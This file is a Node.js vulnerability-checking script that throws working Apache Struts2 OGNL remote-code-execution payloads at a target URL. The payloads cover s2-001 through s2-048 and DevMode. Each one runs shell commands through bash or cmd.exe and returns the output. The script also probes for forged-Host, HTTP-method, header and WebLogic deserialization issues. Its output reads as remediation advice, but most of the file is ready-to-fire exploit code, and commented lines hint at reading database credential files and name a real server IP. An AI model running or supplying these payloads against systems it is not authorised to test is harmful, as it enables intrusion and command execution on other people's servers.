var szMyName = 'M.T.X._2017-06-08',
	request = require('request'),
	urlObj = require('url'),
	child_process = require("child_process"),
	net = require('net'),
	path        = require("path"),
	fs = require('fs'),
	url = "",bReDo = false, szLstLocation = "",
	g_oRst = {},
	iconv = require("iconv-lite"),
	a = process.argv.splice(2),
	bRunHost = false,
	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
	aHS = "content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
	g_postData = "%{(#nike='multipart/form-data')"
		// s-045不允许下面的代码
		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedClasses']=true)"
		+ ".(#rplc=true)"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"

	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}"
		;

if(0 < a.length)url = a[0];
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";

// tomcat测试
// https://www.exploit-db.com/exploits/41783/
// /?{{%25}}cake\=1
// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
// 基于socket发送数据
function fnSocket(h,p,szSend,fnCbk)
{
	const client = net.connect({"port": p,"host":h}, () => 
	{
	  client.write(szSend);
	});
	client.on('data', (data) => 
	{
		fnCbk(data);
		client.end();
	});
	client.on('end', () =>{});
}

// check weblogic T3
// java -jar ~/safe/mtx_jfxl/jfxl.jar 127.0.0.1:7001
function checkWeblogicT3(h,p)
{
	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
	// console.log(s);
	fnSocket(h,p,s,function(data)
	{
		var d = data && data.toString().trim() || "", 
			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
		console.log(d);
		console.log(re.test(d));
	});
}
// checkWeblogicT3("192.168.18.89",7001);

// 解析裸头信息
function fnParseHttpHd(s,fnCbk)
{
	var a = s.trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[aT[0].toLowerCase().trim()] = aT[1].trim();
	}
	if(fnCbk)fnCbk(obj);
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		// checkWeblogicT3(host,port);
		fnCheckJavaFx([host,port].join(":"));
		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
				+ szMyName 
				+ ') ' + g_szUa + ' MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
		+ '\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";
			
			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){console.log(e);}
}

// 单个方法测试
function fnTest(s)
{
	request(
	    { method: s ||'PUT'
	    , uri: url//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    }
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			szLstLocation = url = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "确定不需要该安全头信息 " + aHS[k];
	      		}
	      	}
	      	g_oRst.safeHeader.des = "作为安全要求、规范要求，建议加上缺失的头信息";
	    }
	  );
}

function doStruts2_046(url)
{
	request({method: 'POST',uri: url,"formData":
		{
			custom_file:
			{
				"value":"xxx",
				"options":
				{
					"filename":encodeURIComponent(g_postData),
					"contentType": "image/jpeg"
				}
			}
		}},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-046");
    });
}

// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
function doStruts2_032(url)
{
	var oParms = {};
	oParms["method:" + encodeURIComponent(g_postData)] = "";
	oParms["mtxtest"] = "ok";
	request({method: 'POST',uri: url,"formData":oParms},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-032");
    });
}

// s2-033,s2-037
// s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_037(url)
{
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
	request({method: 'POST',uri: url},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-037");
    });
}
// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
function doStruts2_033(url)
{
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
	request({method: 'POST',uri: url},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-037");
    });
}
   

function doStruts2_048(url,fnCbk)
{
	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
		"(#_memberAccess?(#_memberAccess=#dm):" + 
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
	 	".(#ognlUtil.getExcludedClasses().clear())" + 
		".(#context.setMemberAccess(#dm))))" + 
		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    // g_postData ||
    var data = {
        "name": g_postData || payload,
        "age": 20
    };
    request({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-048");
    	// console.log(e || b || r);
    });
}

// /robots.txt

// http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
// s2_016,s2_017
function doStruts2_016(url)
{
	/*///////////
	var szCode = ("%{(#nike='multipart/form-data')"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
		+ ".getOutputStream()))"
		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}");
	////////////////////////*/
	request({method: 'GET',encoding: null,uri: url + "?redirect:" + encodeURIComponent(g_postData)
		}, 
    	function(e,r,b)
    {
    	// console.log(b);
    	// if(-1 < b.indexOf("administrator"))console.log(b.toString("gbk"));
    	if(!e)fnDoBody(b,"s2-016");
    	// console.log(e || b || r);
    });
}

function myLog(a)
{
	// console.log(String(a.callee))
	var c = a.callee.caller;
	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
	if(a.callee.caller)
	{
		console.log(a.callee.caller.arguments);
		a = a.callee.caller.arguments;
		if(0 < a.length)myLog(a);
	}
}
g_oRst.struts2 || (g_oRst.struts2 = {});
function fnDoBody(body,t,rep)
{
	// win 字符集处理
	if(body && -1 < String(body).indexOf("administrator"))
	{
		 body = iconv.decode(body,"cp936").toString("utf8");
		 // console.log(body);
	}

	var e = fnGetErrMsg(body);
	if(e)g_oRst.errMsg = e;
	// console.log(t);
	var oCa = arguments.callee.caller.arguments;
	if(!rep)rep = oCa[1];
	// error msg
	if(oCa[0])console.log(oCa[0]);
	var repT = oCa[1] || {};
	
	// safegene
	if(repT && repT.headers && repT.headers['safegene_msg'])
		console.log(decodeURIComponent(repT.headers['safegene_msg']));
	// else console.log(repT.statusCode + " " + repT.url)

	body||(body = "");
	if(!body)
	{
		// myLog(arguments);
	}
	if(!body)return;
	body = body.toString("utf8").trim();

	g_oRst.config || (g_oRst.config = {});
	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
	{
		g_oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
	}
	// at 
	if(!g_oRst.config["dev"])
	{
		var re = /Exception\s+at ([^\(]+)\(/gmi;
			re = re.exec(body);
		if(re && 0 < re.length)
		{
			g_oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
		}
	}
	if(!g_oRst.config["x-powered-by"] && rep && rep.headers)
	{
		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
		{
			g_oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
		}
	}
	if(!g_oRst.config["server"] && rep && rep.headers)
	{
		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
		{
			g_oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
		}
	}

	if(!body || -1 == body.indexOf("whoami"))return;
	
	if(-1 < t.indexOf("s2-001"))console.log(body)
	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
	// 误报
	if(-1 < body.indexOf("<body"))return;
	console.log("发现高危漏洞：" + t);
	
	if(0 < i) body = body.substr(0, i).trim();
	// console.log(body);
	var oT = g_oRst.struts2,s1 = String(body).split(/\n/);
	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
	if(-1 < body.indexOf("root") && !oT["root"])
		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	if(s1[0] && 50 > s1[0].length && !oT["user"])
		oT["user"] = "当前中间件启动的用户：" + (-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
	if(1 < s1.length)
		oT["CurDir"] = {des:"当前中间件目录","path":(3 < s1.length ? s1[3] : s1[1]).trim()};
}

function doStruts2_045(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	request({method: 'POST',uri: url
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	// encodeURIComponent不能编码 2017-07-18
	    	"Content-Type":g_postData
	    }}
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-045");
	  		}
	    }
	  );
}

// S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_DevMode(url)
{
	// debug=browser&object=
	// debug=command&expression=
	request({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-DevMode");
    });
}
// s2-007 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '


function doStruts2_001(url)
{
	// 如果编码encodeURIComponent 就会导致不执行？
	request({method: 'POST',uri: url + "?name=" + (g_postData)},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-001,s2-012");
    });
}

//
function doStruts2_019(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	request({method: 'POST',uri: url,
		"formData":{"debug":"command","expression":encodeURIComponent(g_postData)}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }}
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-019");
	  		}
	    }
	  );
}

function doStruts2_029(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	
	var s = 
		// s-045不允许下面的代码
		".(#_memberAccess['allowStaticMethodAccess']=true)"
		+ ".(#_memberAccess['acceptProperties']=true)"
		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		+ ".(#_memberAccess['excludedClasses']=true)"
		// s2-048不能加下面的代码
		+ ".(#_memberAccess['allowPrivateAccess']=true)"
		+ ".(#_memberAccess['allowProtectedAccess']=true)"
		+ ".(#_memberAccess['acceptProperties']=true)"
		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)",
		szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);

		

	request({method: 'POST',uri: url,
		"formData":{"message":encodeURIComponent(szDPt)}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }}
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-029");
	  		}
	    }
	  );
}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	fnDoHostAttack(url,function(o)
	{
		console.log(o);
	},null);
	var aMethod = ["PUT","DELETE","OPTIONS","HEAD", "PATCH"];
	for(var k in aMethod)
		fnTest(aMethod[k]);
}

// 反序列化检测
// java -jar ~/safe/mtx_jfxl/jfxl.jar 192.178.10.1/24:7001
function fnCheckJavaFx(s)
{
	var szF = "~/safe/mtx_jfxl/jfxl.jar";
	child_process.exec("ls " + szF,function(e,so,se)
	{
		if(!so)console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git");
		else
		{
			szF = "java -jar " + szF + " " + s;
			child_process.exec(szF,function(e,so,se)
			{
				szF = __dirname + "/data/" + s.replace(/:/gmi,"_") + ".txt";
				if(fs.existsSync(szF))
				{
					g_oRst.weblogic_java_des = {des:"发现weblogic【高危】java反序列化漏洞",result:szF};
				}
			});
		}
	});
	
}

function fnCheckKeys(b)
{
	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
	g_oRst.checkKeys || (g_oRst.checkKeys = {});
	var oMp = {}, ss;
	if(!g_oRst.checkKeys.passwordInputs)
	{
		while(a = re.exec(b))
		{
			if(!r1.exec(a[0]))
			{
				ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
				if(!oMp[ss])
					oMp[ss] = 1,r.push(ss);
			}
		}
		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
	}
	oMp = {};
	if(!g_oRst.checkKeys.keys)
	{
		s = __dirname + "/urls/keywords";
		a = new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
		re = [];
		while(s = a.exec(b))
		{
			if(!oMp[s[1]])
				oMp[s[1]]=1,re.push(s[1]);
		}
		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
	}
}

// 获取Ta3异常消息
function fnGetErrMsg(body)
{
	if(body)
	{
		body = body.toString();
		fnCheckKeys(body);
		var s1 = "Base._dealdata(", i = body.indexOf(s1);
		if(-1 < i)body = body.substr(i + s1.length);
		s1 = "});";
		i = body.indexOf(s1);
		if(-1 < i)body = body.substr(0, i + 1);
		try
		{
			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
			return o.errorDetail;
		}catch(e)
		{
			var bHv = false;
			i = body.indexOf("at com.yinhai.");
			if(bHv = -1 < i)body = body.substr(i - 11);
			i = body.indexOf("at org.springframework.web.filter.DelegatingFilterProxy.doFilter");
			if(-1 < i)bHv = true,body = body.substr(0,i);
			if(bHv)return body;
		}
	}
	return "";
}
// 检查ta3默认菜单
function fnCheckTa3(u)
{
	var j = u.lastIndexOf('/');
	if(10 < j)u = u.substr(0, j + 1);
	else u += '/';
	var s = __dirname + "/urls/ta3menu.txt",a,i = 0,fnCbk = function(url)
	{
		request({method: 'GET',uri: u + url
		    ,headers:
		    {
		    	"User-Agent": g_szUa
		    }
		}
		, function (error, response, body)
		{
			if(body)
			{
				fnDoBody(body,"ta3menus");
				if(200 === response.statusCode)
				{
					var re = /<title>([^<]*)<\/title>/gmi, t = re.exec(body);
					t && (t = t[1].trim());t || (t = "");
					g_oRst.ta3menus || (g_oRst.ta3menus = {});
					g_oRst.ta3menus.des = "这些url响应http 200";
					g_oRst.ta3menus.urls  || (g_oRst.ta3menus.urls = []);
					g_oRst.ta3menus.urls.push([u + url,t].join(","));
				}
			}
		});
	};
	if(fs.existsSync(s))
	{
		a = String(fs.readFileSync(s)).trim().split(/\n/);
		for(; i < a.length; i++)
		{
			// console.log(a[i]);
			fnCbk(a[i]);
		}
	}
	
}
// 全部编码为%xx格式
function fnMakeData(s)
{
	return s.replace(/./gmi,function(a)
	{
		return '%' + String(a).charCodeAt(0).toString(16);
	});
}

// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.18.89:7001
/*
// console.log(fnMakeData(g_postData));
request.post(//  + encodeURIComponent(g_postData)
	{
	uri:"http://118.112..108:9289/ypcx/services?fileUpload",
	headers:{'Content-Type':'text/xml;charset=UTF-8'},
	formData:{"k":fnMakeData(fnMakeData(g_postData))}
	}
	,function(e,r)
	{
		if(!e)console.log(r.body);
		console.log(e);
	});
//*/
if(0 < a.length)
{
	//*
	// fnCheckTa3(url);
	doStruts2_001(url);
	doStruts2_016(url);
	doStruts2_019(url);
	doStruts2_029(url);
	doStruts2_032(url);
	doStruts2_033(url);
	doStruts2_037(url);
	doStruts2_045(url);
	// 文件上传测试
	// doStruts2_046(url);
	doStruts2_048(url);
	doStruts2_DevMode(url);
	
	fnTestAll();
	////////////////////*/
}


process.on('exit', (code) => 
{
	console.log(JSON.stringify(g_oRst,null,' '));
});

/*
s2-045
node checkUrl.js http://192.168.24.67:22245/
s2-048
node checkUrl.js http://192.168.24.67:22244/integration/saveGangster.action
*/